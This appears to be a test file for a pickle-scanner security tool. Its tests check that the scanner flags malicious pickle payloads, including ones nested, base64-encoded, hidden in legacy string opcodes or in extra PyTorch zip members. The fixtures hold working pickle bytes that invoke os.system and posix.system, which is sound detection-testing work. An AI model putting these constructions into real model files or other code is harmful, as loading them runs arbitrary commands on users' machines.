    report = scan_bytes(payload, source="build-dangerous.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.details.get("opcode") == "BUILD"
        and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


@pytest.mark.parametrize(
    ("payload", "opcode"),
    [
        (b"Pexternal-storage-key\n.", "PERSID"),
        (b"\x80\x04\x8c\x14external-storage-key\x94Q.", "BINPERSID"),
    ],
)
def test_scan_bytes_flags_untrusted_persistent_ids(payload: bytes, opcode: str) -> None:
    report = scan_bytes(payload, source="persistent-id.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("opcode") == opcode for finding in report.findings
    )


def test_scan_bytes_recurses_into_nested_persid_payload() -> None:
    inner = b"\x80\x04cos\nsystem\nPfake_id\n."
    outer = pickle.dumps({"inner": inner}, protocol=4)

    report = scan_bytes(outer, source="nested-persid.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213" and finding.details.get("nested_has_execution_opcode") is True
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("opcode") == "PERSID"
        for finding in report.findings
    )


def test_scan_bytes_merges_nested_opcode_counts_without_flattening_invocations() -> None:
    inner = b"\x80\x04cclick\nopen_file\n)\x810cclick\nopen_file\n)\x810cclick\necho\n)R."
    outer = pickle.dumps({"inner": inner}, protocol=4)

    report = scan_bytes(outer, source="nested-callable-invocations.pkl")

    assert not report.metadata.get("callable_invocations")
    assert "NEWOBJ" not in report.metadata["opcode_counts"]
    assert "REDUCE" not in report.metadata["opcode_counts"]
    assert report.metadata["nested_opcode_counts"]["NEWOBJ"] == 2
    assert report.metadata["nested_opcode_counts"]["REDUCE"] == 1


def test_scan_bytes_continues_raw_nested_scan_after_data_only_payload() -> None:
    nested_bytes = b"AAAAAA\x80\x04}.BBBBBBcos\nsystem\n)R.CCCC"
    payload = b"\x80\x04B" + len(nested_bytes).to_bytes(4, "little") + nested_bytes + b"."

    report = scan_bytes(payload, source="nested-benign-before-malicious.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(notice.code == "nested_payload_detected" for notice in report.notices)
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("encoding") == "raw"
        and finding.details.get("payload_size") == len(b"cos\nsystem\n)R.")
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


def test_scan_bytes_continues_encoded_nested_scan_after_data_only_payload() -> None:
    decoded = b"\x80\x04}." + b"cos\nsystem\n)R."
    payload = pickle.dumps(base64.b64encode(decoded).decode("ascii"), protocol=4)

    report = scan_bytes(payload, source="encoded-benign-before-malicious.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(notice.code == "encoded_nested_payload_detected" for notice in report.notices)
    assert any(
        finding.rule_code == "S601"
        and finding.details.get("encoding") == "base64"
        and finding.details.get("payload_size") == len(b"cos\nsystem\n)R.")
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    "payload",
    [
        b"\x80\x02T\x18\x00\x00\x00AAAAAAcos\nsystem\n)R.BBBB.",
        b"\x80\x02U\x18AAAAAAcos\nsystem\n)R.BBBB.",
        b"\x80\x02S'AAAAAAcos\\x0asystem\\x0a)R.BBBB'\n.",
    ],
    ids=["binstring", "short-binstring", "protocol0-string"],
)
def test_scan_bytes_scans_legacy_string_opcodes_for_raw_nested_payloads(payload: bytes) -> None:
    report = scan_bytes(payload, source="legacy-string-raw-nested.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("encoding") == "raw"
        and finding.details.get("payload_size") == len(b"cos\nsystem\n)R.")
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


RAW_NESTED_UNICODE_LITERAL = b"AAAAAAcos\nsystem\n)R.BBBB"
RAW_NESTED_PICKLE_SIZE = len(b"cos\nsystem\n)R.")
UNICODE_SCALAR_NEAR_MATCH = "AAAAAAco\u2603\nsafe\n)X.BBBB".encode()
BINARY_STACK_GLOBAL_NESTED_PICKLE = b"\x80\x04\x8c\x02os\x94\x8c\x06system\x94\x93)R."


@pytest.mark.parametrize(
    "payload",
    [
        b"\x80\x04" + _short_binunicode(RAW_NESTED_UNICODE_LITERAL) + b".",
        b"\x80\x02" + _binunicode(RAW_NESTED_UNICODE_LITERAL) + b".",
        b"\x80\x04" + _binunicode8(RAW_NESTED_UNICODE_LITERAL) + b".",
        b"VAAAAAAcos\\u000asystem\\u000a)R.BBBB\n.",
    ],
    ids=["short-binunicode", "binunicode", "binunicode8", "protocol0-unicode"],
)
def test_scan_bytes_scans_unicode_opcodes_for_raw_nested_payloads(payload: bytes) -> None:
    report = scan_bytes(payload, source="unicode-raw-nested.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("encoding") == "raw"
        and finding.details.get("payload_size") == RAW_NESTED_PICKLE_SIZE
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    "payload",
    [
        b"\x80\x04"
        + _short_binunicode("".join(chr(byte) for byte in BINARY_STACK_GLOBAL_NESTED_PICKLE).encode("utf-8"))
        + b".",
        b"V" + b"".join(f"\\u{byte:04x}".encode("ascii") for byte in BINARY_STACK_GLOBAL_NESTED_PICKLE) + b"\n.",
    ],
    ids=["short-binunicode", "protocol0-unicode"],
)
def test_scan_bytes_decodes_unicode_scalars_before_probing_raw_nested_payloads(payload: bytes) -> None:
    report = scan_bytes(payload, source="unicode-scalar-raw-nested.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("encoding") == "raw"
        and finding.details.get("payload_size") == len(BINARY_STACK_GLOBAL_NESTED_PICKLE)
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


def test_scan_bytes_scans_protocol0_container_starts_in_unicode_literals() -> None:
    nested_payload = b"(cos\nsystem\n)R."
    report = scan_bytes(
        b"\x80\x02" + _binunicode(b"AAAAAA" + nested_payload + b"BBBB") + b".",
        source="unicode-protocol0-container-raw-nested.pkl",
    )

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("encoding") == "raw"
        and finding.details.get("payload_size") == len(nested_payload)
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


def test_scan_bytes_fails_closed_for_under_limit_malformed_unicode_raw_nested_payloads() -> None:
    nested_payload = b"cos\nsystem\n)R"
    report = scan_bytes(
        b"\x80\x02" + _binunicode(nested_payload) + b".",
        source="unicode-malformed-raw-nested.pkl",
    )

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("encoding") == "raw"
        and finding.details.get("nested_has_execution_opcode") is True
        and finding.details.get("analysis_incomplete") is True
        for finding in report.findings
    )


def test_scan_bytes_scans_ascii_raw_nested_payloads_in_mixed_unicode_literals() -> None:
    report = scan_bytes(
        b"\x80\x02" + _binunicode("prefix\u2603cos\nsystem\n)R.".encode()) + b".",
        source="mixed-unicode-raw-nested.pkl",
    )

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


@pytest.mark.parametrize("literal", ["Value " * 65, "I am a value. " * 65, "list " * 65])
def test_scan_bytes_ignores_repeated_protocol0_prefixes_in_benign_unicode_literals(literal: str) -> None:
    report = scan_bytes(pickle.dumps(literal, protocol=4), source="benign-protocol0-prefix-prose.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(notice.code != "nested_probe_limit" for notice in report.notices)


def test_scan_bytes_ignores_protocol0_inst_like_yaml_text_literals() -> None:
    literal = "!!python/object/apply:builtins.exec\n- !!python/object/apply:operator.add\n"

    report = scan_bytes(pickle.dumps(literal, protocol=4), source="benign-inst-like-yaml.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "S213" for finding in report.findings)


@pytest.mark.parametrize(
    "payload",
    [
        b"\x80\x04" + _short_binunicode(UNICODE_SCALAR_NEAR_MATCH) + b".",
        b"\x80\x02" + _binunicode(UNICODE_SCALAR_NEAR_MATCH) + b".",
        b"\x80\x04" + _binunicode8(UNICODE_SCALAR_NEAR_MATCH) + b".",
        b"VAAAAAAco\\u2603\\u000asafe\\u000a)X.BBBB\n.",
    ],
    ids=["short-binunicode", "binunicode", "binunicode8", "protocol0-unicode"],
)
def test_scan_bytes_ignores_unicode_scalar_raw_nested_near_matches(payload: bytes) -> None:
    report = scan_bytes(payload, source="unicode-raw-nested-near-match.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code not in {"S213", "DANGEROUS_CALL"} for finding in report.findings)


def test_scan_bytes_scans_unicode_raw_nested_dangerous_globals_without_execution_opcodes() -> None:
    report = scan_bytes(
        b"\x80\x02" + _binunicode(b"AAAAAAcos\nsystem\n.BBBB") + b".",
        source="unicode-raw-nested-dangerous-global.pkl",
    )

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL" and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


def test_scan_bytes_fails_closed_for_unicode_raw_nested_payload_over_byte_limit() -> None:
    nested_payload = b"\x80\x04]K\x01aK\x02aK\x03aK\x04a"
    report = scan_bytes(
        b"\x80\x02" + _binunicode(nested_payload) + b".",
        source="unicode-raw-nested-oversized.pkl",
        options=ScanOptions(max_nested_pickle_bytes=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("analysis_incomplete") is True
        and finding.details.get("payload_size") == len(nested_payload)
        for finding in report.findings
    )
    assert any(
        notice.code == "nested_payload_truncated"
        and notice.details.get("encoding") == "raw"
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )


def test_scan_bytes_fails_closed_when_unicode_raw_nested_probe_limit_is_exceeded() -> None:
    decoys = b"\x80\x04}." * 65
    report = scan_bytes(
        b"\x80\x02" + _binunicode(decoys + b"cos\nsystem\n)R.") + b".",
        source="unicode-raw-nested-probe-limit.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("encoding") == "raw"
        and finding.details.get("analysis_incomplete") is True
        and finding.details.get("max_nested_payload_probes") == 64
        for finding in report.findings
    )
    assert any(notice.code == "nested_probe_limit" for notice in report.notices)


def test_scan_bytes_fails_closed_on_malformed_nested_persid_payload() -> None:
    inner = b"\x80\x04cos\nsystem\nP\nfake_id\n."
    outer = pickle.dumps({"inner": inner}, protocol=4)

    report = scan_bytes(outer, source="nested-malformed-persid.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("nested_has_execution_opcode") is True
        and finding.details.get("analysis_incomplete") is True
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_bytes_flags_canonical_pytorch_storage_persistent_ids() -> None:
    payload = (
        b"\x80\x04(\x8c\x07storage\x94\x8c\x05torch\x94\x8c\x0cFloatStorage\x94\x93\x8c\x01k\x94\x8c\x03cpu\x94K\x01tQ."
    )

    report = scan_bytes(payload, source="pytorch-storage.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("opcode") == "BINPERSID"
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("pytorch_storage_key") == "k"
        for finding in report.findings
    )
    import_references = cast(tuple[dict[str, object], ...], report.metadata.get("import_references", ()))
    assert any(
        reference.get("import_reference") == "torch.FloatStorage"
        and reference.get("pytorch_storage_persistent_id") is True
        for reference in import_references
    )
    assert not any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in report.findings)
    assert report.notices == ()


def test_scan_bytes_marks_global_pytorch_storage_persistent_id_import_reference() -> None:
    payload = (
        b"\x80\x02("
        + _binunicode(b"storage")
        + _global(b"torch", b"FloatStorage")
        + _binunicode(b"k")
        + _binunicode(b"cpu")
        + b"K\x01tQ."
    )

    report = scan_bytes(payload, source="global-pytorch-storage.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    import_references = cast(tuple[dict[str, object], ...], report.metadata.get("import_references", ()))
    assert any(
        reference.get("import_reference") == "torch.FloatStorage"
        and reference.get("pytorch_storage_persistent_id") is True
        for reference in import_references
    )
    assert not any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in report.findings)
    assert report.notices == ()


def test_scan_bytes_marks_each_pytorch_storage_persistent_id_import_reference() -> None:
    def storage_persistent_id(name: str, key: str, terminator: bytes) -> bytes:
        return (
            b"("
            + _short_binunicode(b"storage")
            + _short_binunicode(b"torch")
            + _short_binunicode(name.encode())
            + b"\x93"
            + _short_binunicode(key.encode())
            + _short_binunicode(b"cpu")
            + b"K\x01tQ"
            + terminator
        )

    storage_names = [f"Synthetic{index}Storage" for index in range(33)]
    payload = b"\x80\x04" + b"".join(
        storage_persistent_id(name, str(index), b"." if index == len(storage_names) - 1 else b"0")
        for index, name in enumerate(storage_names)
    )

    report = scan_bytes(payload, source="many-pytorch-storage-persistent-ids.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert not any(finding.rule_code == "DANGEROUS_CALL_GRAPH_LIMIT" for finding in report.findings)
    storage_references = [
        reference
        for reference in report.metadata["import_references"]
        if reference.get("module") == "torch" and str(reference.get("name", "")).endswith("Storage")
    ]
    assert len(storage_references) == len(storage_names)
    assert all(reference.get("pytorch_storage_persistent_id") is True for reference in storage_references)


def test_scan_bytes_flags_noncanonical_pytorch_storage_persistent_ids() -> None:
    payload = b"\x80\x04(\x8c\x07storage\x94\x8c\x12torch.FloatStorage\x94\x8c\x04evil\x94\x8c\x03cpu\x94K\x01tQ."

    report = scan_bytes(payload, source="noncanonical-pytorch-storage.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("opcode") == "BINPERSID"
        for finding in report.findings
    )
    assert report.notices == ()


def test_scan_bytes_flags_deeply_nested_persistent_id_preview() -> None:
    payload = b"\x80\x04)" + (b"\x85" * 1500) + b"Q."

    report = scan_bytes(payload, source="deep-persistent-id.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert report.errors == ()
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("opcode") == "BINPERSID"
        for finding in report.findings
    )


def test_scan_bytes_flags_pytorch_storage_persistent_ids_with_bool_size() -> None:
    payload = (
        b"\x80\x04(\x8c\x07storage\x94\x8c\x05torch\x94\x8c\x0cFloatStorage\x94\x93\x8c\x01k\x94\x8c\x03cpu\x94\x88tQ."
    )

    report = scan_bytes(payload, source="bool-sized-pytorch-storage.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("opcode") == "BINPERSID"
        for finding in report.findings
    )
    assert report.notices == ()


def test_scan_bytes_flags_pytorch_storage_persistent_ids_with_extra_fields() -> None:
    payload = (
        b"\x80\x04(\x8c\x07storage\x94\x8c\x05torch\x94\x8c\x0cFloatStorage\x94\x93"
        b"\x8c\x01k\x94\x8c\x03cpu\x94K\x01\x8c\x04evil\x94tQ."
    )

    report = scan_bytes(payload, source="extra-field-pytorch-storage.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("opcode") == "BINPERSID"
        for finding in report.findings
    )
    assert report.notices == ()


def test_scan_bytes_attributes_reduce_calls_to_the_callable_operand_not_nested_args() -> None:
    payload = b"cbuiltins\nlen\n(cos\nsystem\ntR."

    report = scan_bytes(payload, source="reduce-args.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )
    assert not any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


@pytest.mark.parametrize(
    ("payload", "source"),
    [
        (b"cbuiltins\nlen\n}cos\nsystem\nK\x01s\x85R.", "setitem-args.pkl"),
        (b"cbuiltins\nlen\n}(cos\nsystem\nK\x01u\x85R.", "setitems-args.pkl"),
    ],
)
def test_scan_bytes_dict_mutation_operands_do_not_become_reduce_call_targets(payload: bytes, source: str) -> None:
    report = scan_bytes(payload, source=source)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )
    assert not any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


@pytest.mark.parametrize(
    ("payload", "source"),
    [
        (b"\x80\x04cbuiltins\nlen\nq\x00cos\nsystem\n\x94h\x01\x8c\x04echo\x85R.", "memoize-after-put.pkl"),
        (b"\x80\x04cbuiltins\nlen\nqdcos\nsystem\n\x94h\x01\x8c\x04echo\x85R.", "memoize-after-sparse-put.pkl"),
    ],
)
def test_scan_bytes_memoize_index_uses_runtime_memo_size_after_explicit_memo_write(
    payload: bytes,
    source: str,
) -> None:
    report = scan_bytes(payload, source=source)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_stream_uses_explicit_source_and_does_not_leak_prior_scan_state() -> None:
    scanner = PickleScanner()

    safe_report = scanner.scan_bytes(pickle.dumps({"safe": True}), source="safe.pkl")
    malicious_report = scanner.scan_stream(
        io.BytesIO(pickle.dumps(MaliciousPayload())),
        source="payload.pkl",
    )

    assert safe_report.source == "safe.pkl"
    assert malicious_report.source == "payload.pkl"
    assert malicious_report.verdict == SafetyVerdict.MALICIOUS
    assert all(
        finding.location is not None and "payload.pkl" in finding.location for finding in malicious_report.findings
    )


def test_scan_file_scans_strict_pickle_path(tmp_path: Path) -> None:
    payload_path = tmp_path / "safe.pkl"
    payload_path.write_bytes(pickle.dumps({"safe": True}))

    report = scan_file(payload_path)

    assert report.source == str(payload_path)
    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.coverage.bytes_total == payload_path.stat().st_size


@pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".PT"])
def test_scan_file_reports_unsupported_checkpoint_suffix_zip(suffix: str, tmp_path: Path) -> None:
    archive_path = tmp_path / f"not-a-checkpoint{suffix}"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("data.pkl", pickle.dumps({"safe": True}, protocol=4))

    report = scan_file(archive_path)

    assert report.source == str(archive_path)
    assert report.metadata.get("container_type") != "pytorch_zip"
    assert report.metadata == {"container_type": "zip", "analysis_incomplete": True}
    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert len(report.errors) == 1
    assert report.errors[0].category == "unsupported_zip_container"
    assert report.errors[0].location == str(archive_path)
    assert report.errors[0].exception_type == "ValueError"
    assert report.errors[0].details == {"analysis_incomplete": True}
    assert report.coverage.bytes_scanned == 0
    assert report.coverage.bytes_total == archive_path.stat().st_size
    assert not report.coverage.raw_scan_complete
    assert not report.coverage.opcode_scan_complete


def test_scan_file_scans_pytorch_zip_data_pickle(tmp_path: Path) -> None:
    archive_path = tmp_path / "model.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")

    report = scan_file(archive_path)

    assert report.source == str(archive_path)
    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.metadata["container_type"] == "pytorch_zip"
    assert list(report.metadata["pickle_files"]) == ["archive/data.pkl"]
    source_fingerprints = report.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["reusable"] is True
    assert source_fingerprints["fingerprints"] == {}
    assert source_fingerprints["read_fingerprints"] == {}
    assert report.coverage.bytes_total == archive_path.stat().st_size
    assert report.coverage.bytes_scanned > 0


def test_scan_file_combines_pytorch_zip_private_source_fingerprints(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source_root = tmp_path / "src"
    source_root.mkdir()
    helper_module = "modelaudit_picklescan_test_combined_helper"
    other_module = "modelaudit_picklescan_test_combined_other"
    helper_path = source_root / f"{helper_module}.py"
    helper_path.write_text("def entrypoint():\n    return 1\n")
    other_path = source_root / f"{other_module}.py"
    other_path.write_text("def entrypoint():\n    return 2\n")
    monkeypatch.syspath_prepend(str(source_root))
    _isolate_reusable_meta_path_finders(monkeypatch)

    archive_path = tmp_path / "model.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(
            "archive/data.pkl",
            b"\x80\x04" + _global(helper_module.encode(), b"entrypoint") + b")R.",
        )
        archive.writestr(
            "archive/extra.pkl",
            b"\x80\x04" + _global(other_module.encode(), b"entrypoint") + b")R.",
        )
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")

    report = scan_file(archive_path)

    assert "call_graph_source_fingerprints" not in report.metadata
    assert "call_graph_source_fingerprints" not in report.to_dict()["metadata"]
    source_fingerprints = report.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["reusable"] is True
    assert str(helper_path.absolute()) in source_fingerprints["fingerprints"]
    assert str(other_path.absolute()) in source_fingerprints["fingerprints"]
    assert str(helper_path.absolute()) in source_fingerprints["read_fingerprints"]
    assert str(other_path.absolute()) in source_fingerprints["read_fingerprints"]
    assert source_fingerprints["module_sources"] == {
        helper_module: str(helper_path.absolute()),
        other_module: str(other_path.absolute()),
    }
    assert source_fingerprints["loaded_module_sources"] == {}


def test_merge_call_graph_source_fingerprint_metadata_marks_read_conflict_unreusable() -> None:
    context = {"meta_path": ["importlib.PathFinder"], "path_hooks": [], "path_importers": []}
    existing = {
        "reusable": True,
        "search_context": ["/tmp/src"],
        "resolution_context": context,
        "module_sources": {},
        "loaded_module_sources": {},
        "fingerprints": {},
        "read_fingerprints": {
            "/tmp/src/helper.py": {"read_limit": 1024, "require_complete": True, "fingerprint": "1111"}
        },
    }
    incoming = {
        **existing,
        "read_fingerprints": {
            "/tmp/src/helper.py": {"read_limit": 1024, "require_complete": True, "fingerprint": "2222"}
        },
    }

    merged = package_api._merge_call_graph_source_fingerprint_metadata(existing, incoming)

    assert merged["reusable"] is False
    assert merged["read_fingerprints"]["/tmp/src/helper.py"]["fingerprint"] == "1111"


def test_merge_call_graph_source_fingerprints_preserves_source_independence_only_when_all_members_are() -> None:
    source_independent = package_api._source_independent_call_graph_fingerprint_metadata()
    source_sensitive = {
        "reusable": True,
        "search_context": ["source-root"],
        "resolution_context": {"meta_path": [], "path_hooks": [], "path_importers": []},
        "fingerprints": {"source.py": "digest"},
        "read_fingerprints": {},
        "module_sources": {"source": "source.py"},
        "loaded_module_sources": {},
        "loaded_package_paths": {},
    }

    assert package_api._merge_call_graph_source_fingerprint_metadata(None, source_independent) == source_independent
    assert (
        package_api._merge_call_graph_source_fingerprint_metadata(source_independent, source_independent)
        == source_independent
    )
    assert (
        package_api._merge_call_graph_source_fingerprint_metadata(source_independent, source_sensitive)
        == source_sensitive
    )
    assert (
        package_api._merge_call_graph_source_fingerprint_metadata(source_sensitive, source_independent)
        == source_sensitive
    )


def test_combine_pytorch_zip_reports_marks_missing_member_fingerprint_provenance_unreusable() -> None:
    source_independent = package_api._source_independent_call_graph_fingerprint_metadata()
    proven_member = PickleReport(
        source="model.pt:archive/data.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        private_metadata={"call_graph_source_fingerprints": source_independent},
    )
    unproven_member = PickleReport(
        source="model.pt:archive/extra.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
    )

    private_metadata = package_api._combine_call_graph_source_fingerprint_private_metadata(
        [proven_member, unproven_member]
    )

    assert private_metadata["call_graph_source_fingerprints"]["reusable"] is False
    assert "source_independent" not in private_metadata["call_graph_source_fingerprints"]


@pytest.mark.parametrize(
    "metadata_key",
    [
        "import_references_truncated",
        "callable_invocations_truncated",
        "non_allowlisted_global_imports_truncated",
    ],
)
def test_combine_pytorch_zip_reports_preserves_member_truncation_metadata(metadata_key: str) -> None:
    pickle_entry = zipfile.ZipInfo("archive/data.pkl")
    member_report = PickleReport(
        source="model.pt:archive/data.pkl",
        status=ScanStatus.INCONCLUSIVE,
        verdict=SafetyVerdict.UNKNOWN,
        coverage=CoverageSummary(bytes_scanned=1, bytes_total=1),
        metadata={"analysis_incomplete": True, metadata_key: True},
    )

    report = package_api._combine_pytorch_zip_reports(
        source="model.pt",
        size=1,
        entry_count=1,
        pickle_entries=[pickle_entry],
        member_reports=[member_report],
        extra_notices=(),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.metadata["analysis_incomplete"] is True
    assert report.metadata[metadata_key] is True


def test_merge_call_graph_source_fingerprints_rejects_conflicting_read_records() -> None:
    context = {"meta_path": ["importlib.PathFinder"], "path_hooks": [], "path_importers": []}
    first = {
        "reusable": True,
        "search_context": ["/tmp/src"],
        "resolution_context": context,
        "module_sources": {},
        "loaded_module_sources": {},
        "loaded_package_paths": {},
        "fingerprints": {},
        "read_fingerprints": {
            "/tmp/src/__pycache__": {"read_limit": 1048576, "require_complete": True, "fingerprint": "1111"}
        },
    }
    second = {
        **first,
        "read_fingerprints": {
            "/tmp/src/__pycache__": {"read_limit": 1048576, "require_complete": True, "fingerprint": "2222"}
        },
    }

    merged = package_api._merge_call_graph_source_fingerprint_metadata(first, second)

    assert merged["reusable"] is False
    assert merged["read_fingerprints"]["/tmp/src/__pycache__"]["fingerprint"] == "1111"


def test_scan_file_detects_hidden_pytorch_zip_pickle_member_with_data_pickle(tmp_path: Path) -> None:
    archive_path = tmp_path / "model.pt"
    hidden_payload = b"cposix\nsystem\n(S'echo hidden'\ntR."
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")
        archive.writestr("archive/payload", hidden_payload)

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert list(report.metadata["pickle_files"]) == ["archive/data.pkl", "archive/payload"]
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.location is not None
        and f"{archive_path}:archive/payload" in finding.location
        for finding in report.findings
    )


def test_scan_file_does_not_route_benign_storage_blob_as_hidden_pickle(tmp_path: Path) -> None:
    archive_path = tmp_path / "model.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")
        archive.writestr("archive/data/0", b"\x00" * 1024)
        archive.writestr("archive/notes", b"cat is a category label, not a GLOBAL opcode stream")

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert list(report.metadata["pickle_files"]) == ["archive/data.pkl"]


def test_scan_file_does_not_route_large_trivial_proto0_text_as_hidden_pickle(tmp_path: Path) -> None:
    archive_path = tmp_path / "model.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")
        archive.writestr("archive/constants", b"I0\n0" * 20_000)

    report = scan_file(archive_path)

